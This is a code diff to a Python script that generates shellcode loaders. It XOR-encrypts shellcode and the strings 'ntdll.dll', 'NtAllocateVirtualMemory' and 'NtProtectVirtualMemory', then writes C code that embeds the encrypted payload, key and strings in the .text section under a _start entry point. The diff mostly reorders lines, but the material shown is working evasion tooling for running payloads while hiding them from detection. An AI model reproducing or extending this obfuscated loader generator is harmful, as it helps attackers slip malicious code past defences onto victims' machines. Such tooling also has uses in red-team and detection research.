@@ -61,11 +61,8 @@ def bytes_to_c_array(b: bytes) -> str:
 for i in range(iterations):
     key = fixed_key if fixed_key else [random.randint(1, 255) for _ in range(key_length)]
 
-    xor_shellcode = xor_bytes(current_shellcode, key)
-    shellcode_array = bytes_to_c_array(xor_shellcode)
-    key_array = bytes_to_c_array(key)
-
     c_strings = ["ntdll.dll", "NtAllocateVirtualMemory", "NtProtectVirtualMemory"]
+    xor_shellcode = xor_bytes(current_shellcode, key)
     xor_c_strings = [xor_c_string(s, key) for s in c_strings]
 
     offsets = []
@@ -75,7 +72,9 @@ for i in range(iterations):
         current_offset += len(s)
     stackbuf_size = current_offset
 
+    shellcode_array = bytes_to_c_array(xor_shellcode)
     combined_array = bytes_to_c_array(b"".join(xor_c_strings))
+    key_array = bytes_to_c_array(key)
 
     c_code = f'''#include "winapi_loader.h"
 
@@ -97,8 +96,8 @@ typedef NTSTATUS (NTAPI *NtProtectVirtualMemory_t)(
 );
 
 __attribute__((section(".text"))) static unsigned char shellcode[] = {{ {shellcode_array} }};
-__attribute__((section(".text"))) static unsigned char key[] = {{ {key_array} }};
 __attribute__((section(".text"))) static unsigned char enc_strings[] = {{ {combined_array} }};
+__attribute__((section(".text"))) static unsigned char key[] = {{ {key_array} }};
     
 __attribute__((section(".text.start")))
 void _start() {{
@@ -191,5 +190,6 @@ void _start() {{
 
 if iterations > 1:
     print(f"[+] Shellcode generated: {output_bin}")
+
 
 
